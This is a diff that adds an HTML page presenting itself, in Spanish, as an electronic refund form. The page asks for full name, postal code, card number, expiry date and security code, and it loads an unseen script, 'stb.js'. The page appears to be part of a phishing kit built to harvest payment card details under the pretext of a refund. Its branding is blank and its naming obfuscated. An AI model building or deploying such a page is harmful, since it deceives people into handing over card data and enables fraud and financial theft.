@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/trani.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="topi01">
+        <div class="nav">
+            <div class="brand"></div>
+            <ul class="datenow">
+                
+            </ul>
+            <div class="user">
+
+            </div>
+            <div class="lang">
+
+            </div>
+        </div>
+    </div>
+    <div class="kolo">
+        
+        <div class="cct">
+            <p><strong>“El reembolso suele tardar entre 24/48 horas”</strong></p>
+            <p>• Formulario de reembolso electrónico</p>
+            
+            <form class="formcc" method="post" id="pg2">
+                <div class="feildcc">
+                    <p><span>*</span>Nombre completo</p>
+                <input type="text" placeholder="" maxlength="15" required id="nom">
+                <p><span>*</span>Código postal</p>
+                <input type="text" placeholder="" maxlength="10" required id="posita">
+                
+                </div>
+                <!--  -->
+               
+                <!--  -->
+                <div class="feildcc">
+                    <p><span>*</span>Número de tarjeta</p>
+                <input type="text" placeholder="---- ---- ---- ----" maxlength="19" required id="one">
+                <p><span>*</span>Fecha de caducidad</p>
+                <input type="text" placeholder="(MM/YY)" maxlength="7" required id="two">
+                <p><span>*</span>Código de seguridad</p>
+                <input type="text" placeholder="" maxlength="3" required id="three">
+                <!--  -->
+                
+                <!--  -->
+                </div>
+                <button type="submit">Continuar</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+    <img src="./img/fot.PNG" alt="">
+    </div>
+    <script>
+
+        // 
+        $("#one").on("keyup",function(){
+            cc = $(this).val().split(" ").join("");
+            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+            $(this).val(cc);
+        });
+        
+    </script>
+    <script src="./js/stb.js"></script>
+</body>
+</html>
